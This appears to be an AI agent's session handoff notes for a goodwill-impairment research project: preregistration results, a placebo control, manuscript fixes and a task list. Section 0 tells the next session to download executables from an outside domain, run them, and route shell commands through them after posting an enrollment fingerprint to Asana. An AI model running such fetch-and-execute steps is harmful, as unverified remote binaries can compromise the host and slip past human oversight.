---
project: wealth-tensor
gh_sha: 0a0e73d
updated: 2026-08-13
session: wealthTensor-19
gate_passed: true
gate_version: "2.50"
---

# wealth-tensor — HANDOFF

*Overwritten every session. `git log -p docs/HANDOFF.md` is the archive. Run
`python3 scripts/handoff_gate.py --check` before trusting this file.*

## 0 · TRANSPORT — darlish, zero-bridge

```
curl -s https://system.europeanflorist.com/dsh/darlish-up -o /tmp/darlish-up && chmod +x /tmp/darlish-up && /tmp/darlish-up
```

Post the printed `DARLISH-ENROLL v1 id=… fp=…` line **exactly** as a comment on Asana task
`1217316841710435` via the session's Asana MCP, then run `/tmp/darlish-up` again to collect.
First collect has worked `-06` through `-19` without exception. `-17` proved the pipe survives the
bridge dropping; `-18` proved it survives the host rebooting. **Never restart anything to fix
darlish, and do not re-enrol after a reboot — just call `dx`.** A reboot costs you your roster
row and nothing else: re-run `roster join` and `roster claim`.

```
curl -s https://system.europeanflorist.com/dsh/dx -o /tmp/dx && chmod +x /tmp/dx
/tmp/dx '~/Scripts/roster join --who big-wealthTensor-20 --task "<what you are doing>"'
/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-20 --resource wealth-tensor'
```

`export LESSONS_CONTRIBUTOR=opus` **before any `lessons.py add`**. Four leaves banked this
session — three global, one project-scoped.

**Never inline a multi-line string in a `dx '...'` argument.** Write a local file, `--put` it,
`git commit -F`. Used four times this session, no incidents. The same trick is required for
`lessons.py add`, whose text is full of apostrophes: **write a `bank.sh`, `--put` it, run it** —
that worked cleanly for four leaves and two corroborations in one shot. `dx --get` fails on
binary — base64 both ways, and note **macOS `base64` needs `-i`/`-o`, not a positional filename**
(GNU-style `base64 -d file` fails on darwin; that cost one round trip). Quote remote paths.
Exit 3 = never reached darwin, safe to re-run; exit 4 = started, check state first. **Use
`./.venv/bin/python`** — `python3 -m pytest` dies at collection because scipy lives only in the
venv. **286 tests, ~40 s** (was 276).

**The roster contention warning naming YOU is still noise.** Carded on State Machine
`1217420907841952`. Do not spend a turn on it.

### THE THREE THINGS THAT COST `-18` A RUN EACH — still true, still read this first

All three are the same mistake: **reconstructing registered machinery from its signature instead
of copying its call site.**

1. **`extract_events` defaults to `onset_rule="streak"`, which is PRE-001. The registered
   PRE-002/REG-003 sample is `onset_rule="peak"`.** Call site: `wt089_harvest.py:83` —
   `include_annual_attributed=True, onset_rule="peak", signal="revenue"`. **Copy it.**
2. **`peak_onset` returns a TUPLE `(onset, censored)`**, so `if … is not None` is always true and
   inflates the risk set. The real logic is `wt089_riskset.eligible_quarters`, fourteen lines.
3. **ALWAYS RUN THE UNCHANGED ARM AS A CONTROL, IN THE SAME PASS.** `-19` promoted this to a
   registered falsifier (REG-007 F8) and it is the single most valuable thing the session did:
   the placebo arm is what turned a boring null into a result. See §2.

**`-19` adds a fourth, and it is the same shape one level up: the committed PANEL is registered
machinery too.** `data/reg-006-wt092-panel.json` carries `cik`, `sic`, `universe` and per-`fy_end`
`t0/t1/t2/G/G_present/A` for 1,602 firms. **Re-read it. Do not rebuild it from `edgar.py`.**
REG-007 §3.1 forbids the rebuild in writing for exactly this reason.

### `severity.check`'s witness contract

A **zero-argument callable returning the SAME PREDICATE evaluated on a world where the claim is
FALSE**, which must come back **falsy**. Returning the raw quantity makes the guard VACUOUS and
the run dies with `PHANTOM TAG`. The falsifying world must be **RUNNABLE**. `-19` ran 8 severe ·
1 definitional · 0 vacuous, first try, by copying `wt092_sequencing_vs_coupling.py:172`'s call
site rather than reconstructing the signature.

### Editing the manuscript

`scripts/patchkit.py`, `apply_edits`, never `sed`. **Copy anchors out of a `dx --get` copy WITH
THEIR LINE BREAKS** — and **with their leading indentation**: `-19`'s Limitation 9 anchor failed
on three leading spaces inside a numbered list item, nothing written, one round trip.

**AND THE FAILURE PATCHKIT CANNOT SEE — now sighted three times, so treat it as certain.**
Prose that navigates POSITIONALLY. `-18` inserted a column and pointed §4.4's "The column beside
it" at the wrong column. `-19` appended a §7 ledger row that would have re-pointed "**The last
row** is the one this programme would defend hardest" at a row written five minutes earlier;
patchkit compares HEADINGS, not references, so nothing would have flagged it. **Before adding a
row, column or list item, grep the surrounding prose for `last`, `first`, `fifth`, `latter`,
`former`, `above`, `below`, `beside`, `right-hand` — and replace every ordinal you find with the
item's own NAME, in the same patch.** Done for "the last row"; the survivor is teed up in §6.

## 1 · WHAT HAPPENED — THE DISCLOSURE ROUTE IS OPEN AND IDENTIFIED, AND THE INSTRUMENT BUILT ON IT IS NOT SHARP ENOUGH

`REG-007` registered and pushed **alone** (**656b914**) before a line of `wt093` existed;
`RESULT-REG-007` at **c6d45f4**; the manuscript repairs at **0a0e73d**. **286 tests green (was
276)**; numbering preserved — 2 `#`, 15 `##`, 29 `###`, 17 `---`; paper III now **2,634 lines**;
gate PASS; tree clean and pushed.

**The identification is the contribution, and it survives the null.** REG-006 left two
explanations standing for §5.4's off-diagonality and showed the CHARGE cannot decompose them —
the observed complementarity is a net of a positive co-testing channel and a negative recognition
channel. The natural next move is the triggering DISCLOSURE, and `-19`'s first real finding is
about who is *required* to write one:

> **`ASC 350-20-50-2(a)` compels "a description of the facts and circumstances leading to the
> impairment" only "for each goodwill impairment loss recognized." When an interim test is run
> and nothing is charged, NO paragraph of `ASC 350-20-50` requires anything** — 50-1, 50-1A,
> 50-2, 50-3, 50-3A, 50-3B, 50-4, 50-5, 50-6, 50-7 is the whole Section. That case is MD&A-driven:
> Reg S-K Item 303, Release 33-8350 §V, and Division of Corporation Finance FRM §9510.1–9510.3.

So a triggering-event population assembled the obvious way is **conditioned on the outcome under
study**, and firms that tested and passed are silently absent. **The fix is a window, not a
control variable:** restrict to firm-years with a recognised goodwill loss, where the mandate
falls uniformly on both arms of the JOINT-versus-GOODWILL-ONLY comparison and is therefore
orthogonal to the split. That is registered in REG-007 §1 and it is what makes the design
identified. **It is now in §5.4 and Limitation 9, and it stands on the argument, not on Λ.**

## 2 · THE PLACEBO IS THE RESULT, AND IT IS WHY F8 WAS WORTH REGISTERING

| | firm-years classified | (f)-family trigger rate |
|---|---|---|
| mandated-disclosure window (`G > 0`) | 644 | **0.436** |
| placebo (`t > 0`, `G = 0`), where 50-2(a) does not apply | 1,189 | **0.403** |

**Three percentage points.** If the keyword families were reading a firm's actual trigger, the
placebo — no mandate, no goodwill test necessarily run — should be far below. **The classifier is
reading something present whether or not a goodwill impairment occurred.** Λ itself:

| fold | JOINT | GOODWILL-ONLY | Λ | Fisher two-sided *p* |
|---|---|---|---|---|
| `BOTH` → names-(f) | 136/244 = 0.5574 | 145/281 = 0.5160 | **+0.0414** | 0.3805 |
| `BOTH` → the other way | 20/244 = 0.0820 | 32/281 = 0.1139 | **−0.0319** | 0.2435 |

**The sign of Λ is a coding choice**, and REG-007 §3.4 required both variants precisely so this
could not be found afterwards and resolved conveniently. REG-007 §5 P3 registered *before the
run* that Λ ≈ 0 is uninformative, because the omission of an internal trigger runs one way.
**Do not read this as evidence the coupling is economic.** Same discipline as ladders A/A3/R.

*Post-hoc and labelled as such in `data/reg-007-polysemy-audit.json`:* 16 of the 60 adjudicated
windows are accounting-policy boilerplate — "reviewed for impairment upon certain triggering
events" — prose that recites the policy and names no event. That is almost certainly what the
0.403 is made of.

## 3 · THE GUARD THAT REFUSED, AND WHY THE DENOMINATOR WAS WRONG RATHER THAN THE CEILING

**F5 fired first at 213/736 = 28.9% against a registered 20% ceiling and refused to report
anything.** 92 of those 213 firm-years contain **none of the nine registered phrases at all**.
F5's registered text refutes "the keyword families … as a **partition** of the (a)–(g) space" —
and a firm-year that never presented a point in that space cannot be evidence the families fail
to partition it. **That is the exact mirror of REG-006's Q4**, where firm-years with no goodwill
at all were counted as "unresolved" until the registration was read twice.

**The ceiling was NOT moved.** Only the denominator: **119/644 = 18.5%**, with the strict
**211/736 = 28.7%** printed beside it, and `SILENT` promoted to a fifth cell with its own guard
so the two states can never be folded back together. Banked globally: *when a registered guard
refuses to report, check its denominator before its threshold.*

**And `-19` shipped `-18`'s own defect, three hours after reading the lesson.** F2 found two DEAD
keywords in the freshly-written classification families. `composition of its net assets` matches
**zero** passages because the standard reads "a change in the composition **or carrying amount**
of its net assets" and collapsing the disjunction produced a string no filing contains. **F2
caught it by name on the first run — the mechanism working — and REG-007 registered the handling
as *report it, do not fix it*, so the families ran as registered and the defect is published
rather than patched.** `tests/test_reg007_resolution.py`, ten offline tests, pins it.

## 4 · JASON'S RULINGS — DO NOT REOPEN

- **§4.4's table is SETTLED.** Ruled `-18`, after a two-round conversation. He took **both** the
  α̂ = 0.408 column and the "the calibration" label; the label is what stops the calibration
  column reading as vestigial once a measured column sits beside it, and neither move survives
  alone. **Off the at-bat list permanently.**
- **The `## References` provenance block STAYS AS IT IS.** Ruled `-16`.
- His standing test, stated `-18`: **"will the econometrician be able to follow the line of
  thought?"** Reader before referee. Across three papers the pieces fit like Lego.

## 5 · THE PAPERS

**Paper III** — `docs/papers/paper-III-dual-tensor/paper-III.md`, **2,634 lines** (was 2,624).

| § | what changed this session |
|---|---|
| 5.4 | the selection statement and the 0.436/0.403 pair, **replacing** the trailing sentence that duplicated Limitation 9 — charter §2, a CUT not an ABSORB |
| 9 · Limitation 9 | one clause naming the disclosure route as closed by a selection argument rather than by sample size |
| 7 | **one ledger row** for REG-007, and the ordinal "the last row" re-anchored by name in the same patch |

## 6 · THE AT-BAT, RANKED

1. **THE TWO CELLS THE REPAIRED INSTRUMENT CAN NOW SEE, AND THE PAPER STILL REPORTS AS ZERO.
   Untouched by `-19` and now the cheapest live question in the project.** With a half-blind
   tier 0, retail's PP&E × finite-lived and PP&E × indefinite-lived read **0.00× (p = 1.0000)**
   and **3.27×**. Repaired they are **7.70× (p 0.012)** and **6.33× (p 0.0048)**.
   `RESULT-REG-006` §2.2 has them; **§5.4 does not**, because §5.4 reports the registered
   committed sample. That is a defensible scope line AND a live question — **a cell printed as a
   measured zero that is really a significant coupling is empty-versus-absent in its fifth
   costume.** Decide it deliberately. It needs a ruling or a paragraph, not a new crawl.
2. **THE NEXT DISCLOSURE INSTRUMENT IS A PARSING PROBLEM, NOT A LEXICON PROBLEM.** Do not answer
   §2 with a bigger keyword list: the registered families reach 0.436 in the window and 0.403 in
   the placebo, and adding keywords moves both. What separates them is what only exists in
   event-specific narrative — the **named** reporting unit, the **dated** trigger, the charge
   amount tied to the sentence. Sentence-level parsing with the reporting-unit name as the key.
   **New registration.** Fold in the two dead keywords and the corrected
   "composition or carrying amount" wording while you are there; both changes are registered
   territory, not patches.
3. **`data/reg-007-passages.json.gz` IS COMMITTED (3.7 MB, 1,925 firm-years, 9,852 passages).**
   Any successor instrument reads it instead of re-crawling. The harvest took ~7 minutes for
   ~2,600 SEC requests at 6 workers; there is no reason to pay that twice.
4. **THE `## 7` ORDINAL THAT COULD NOT BE FIXED — a real bug, deliberately not guessed at.**
   §7's closing paragraph opens "**The fifth** is the reason this section is not decoration",
   and describes a check written to confirm that an identification result explained a registered
   null, which refused in every one of 400 draws. **That description matches no fifth row of the
   current table.** Guessing would swap a knowable ambiguity for an unknowable error. Whoever
   knows which row it is: name it, the way "the last row" now names the guards'-audit row.
5. **THE σ-AND-LIFETIME RESULT STILL NEEDS NEW DATA.** Realised return volatility and disclosed
   useful lives are not in this sample. **Do not proxy** — WT-038, a three-time payer.
6. **PRIOR ART: the gap looks real, and the shape of the evidence is now exact.** The complete
   published text of **Amel-Zadeh, Glaum & Sellhorn (2023)**, *EAR* 32(2): 415–446, was read this
   session (CC-BY version of record, Oxford ORA). Full-text counts: `ASC 350-20` **0**,
   `ordering` **0**, `order in which` **0**, `co-movement` **0**; all six `sequenc` hits are
   "consequently". Its §5.1.2 confound catalogue and its §5.3.1 "questions that remain
   unanswered" do not mention test sequencing. The IASB's own 58-page *Goodwill and impairment:
   academic evidence* returns zero for `ordering`, `before goodwill`, `350-20`, `triggering
   event`. **Recorded as "not found by keyword search", NOT as "does not exist"** — Google
   Scholar returned `ROBOTS_DISALLOWED` and SSRN search sat behind Cloudflare, so no
   citation-forward sweep was possible. **The two unread leads, so you start above zero: Cready
   et al. (2012) and Hirschey & Richardson (2002)**, which AZG&S cite for restructuring charges
   accompanying impairments — the nearest thing in that literature to this question, and framed
   there as event-study contamination rather than sequencing.
7. **F11 IS STILL OPEN AND STILL CHEAP.** FRM §9510.2 cites S-K **303(a)(3)(ii)**, pre-Release
   33-10890 numbering. Nothing printed depends on it yet. Verify against the current CFR before
   any S-K citation reaches the manuscript.

## 7 · DO NOT

- **ASK A SUBAGENT FOR ITS UNVERIFIED LIST EXPLICITLY.** Best output of both subagents again this
  session: one refuted the premise of the question it was asked (AZG&S does **not** flag the
  sequencing gap), corrected a citation before it was built on (the "not all-inclusive" language
  is `350-20-35-3F`, **not** `35-3C`), caught that `350-20-35-31` is a **four-sentence** paragraph
  whose parenthetical sits in the second, and flagged that **`IAS 36 ¶104` and `ASC 350-20-35-31`
  RUN IN OPPOSITE DIRECTIONS** — 104 is a loss-allocation waterfall hitting goodwill *first*,
  35-31 is a test-ordering rule writing other assets down *before* the goodwill test. **Never
  cite one for the other.** Both subagents were explicit that FASB's own server returned 403 to
  every attempt and that all Codification text is practitioner reproduction; that limit is in
  `RESULT-REG-007` §3 F9/F10 and must stay there.
- Do not read §5.4 as a rescue of PRE-001. REG-003 §7 ruled it out in writing before the number
  existed; nothing in REG-004/005/006/007 touches it.
- Do not restore "PRE-001 was doomed by the φδ confound" — false; wt082, wt083, wt088 E7.
- Do not remove the Bateman, Nerlove or Beaver & Ryan concessions. Do not restore "global rather
  than local" to Kuan, the unordered-pair statement to Bellman & Åström, or the bias/lag DESIGN
  to Ryan (1995). Do not reopen Griliches (1967) — closed with evidence.
- **DO NOT REOPEN the `## References` provenance block or §4.4's table.** Both ruled by Jason.
- **DO NOT POLISH §4.9, §4.10 or §5.4.** §5.4 was amended surgically this session under REG-007
  §7's *pre-committed* repairs and is otherwise closed. A registered amendment is not polish; a
  second pass over the same prose would be.
- **Do not edit `TIER_TAGS`.** PRE-001's constants are a contract; `test_edgar.py` and
  `test_tag_resolution.py` guard them. Corrections live in `TIER_TAGS_REG006`.
- **Do not widen REG-007's phrase set or keyword families.** They are frozen in REG-007 §3.2/§3.3
  and running them as registered — dead keywords and all — is what makes the audit worth
  anything. An extension is a new registration.
- Do not quote a single "recognition rate" or a single "effective recognition rate" — §4.10 shows
  the name covers three quantities 15% apart at a three-year life; α_eff is a function of δ.
- Do not report a δ-rectangle share from REG-004 or REG-005 — both complements are empty and both
  were withheld deliberately, in advance.
- **Do not read ladders A/R/A3's failure, or REG-007's null, as evidence about the world.** F4b
  showed the estimator loses half the signal in a world built to contain it; REG-007's own
  placebo shows its classifier reads boilerplate. A null from an instrument that registered or
  measured its own blindness is a finding about the instrument.
- Do not hand Jason a ranked list of problems as the deliverable. Do not run a pure-teardown pass.
- Do not invoke Mayo or error-statistical philosophy as a warrant. Pragmatic justification.
- Do not ask him to submit anything. Never add a free parameter to absorb an objection.
- Do not rewrite or summarise the charter inside a handoff.
- Adding a section means DELETING conduct narration elsewhere, not refreshing `.coach-baseline.json`.
- **gate-selfcheck is PASS.** If it fails for you it is new.

## 8 · STUDENT-IN — `-19` FINALLY RAN IT, AND IT PAID

```
python3 ~/repos/claude-blackbook/lessons.py doctrine
python3 ~/repos/claude-blackbook/lessons.py search "<the task>" --scope global,wealth-tensor
```

`-17` and `-18` both skipped this. `-19` ran it before writing anything and the two
preregistration leaves it surfaced (`2026-08-10-pre-registration-must-precede-instruments-code`,
`2026-08-05-prediction-prediction-commit-order-commit-registration`) are why REG-007 went out as
a **lone commit** with no instrument code in it. Both are now corroborated:
`lessons.py use <id> --task <tag>` at student-in, `lessons.py record-outcome <tag> pass` at wrap.
**Do the same.** Four new leaves this session — three global (disclosure selection, guard
denominators, ordinal prose) and one project-scoped (EDGAR FTS operational facts, including that
phrase-AND is **within-file**, that `hits.total` counts documents while `from=` silently repeats
pages past the end, and that `data.sec.gov/submissions` is uncapped but `filings.recent` stops
near 1,000 entries).
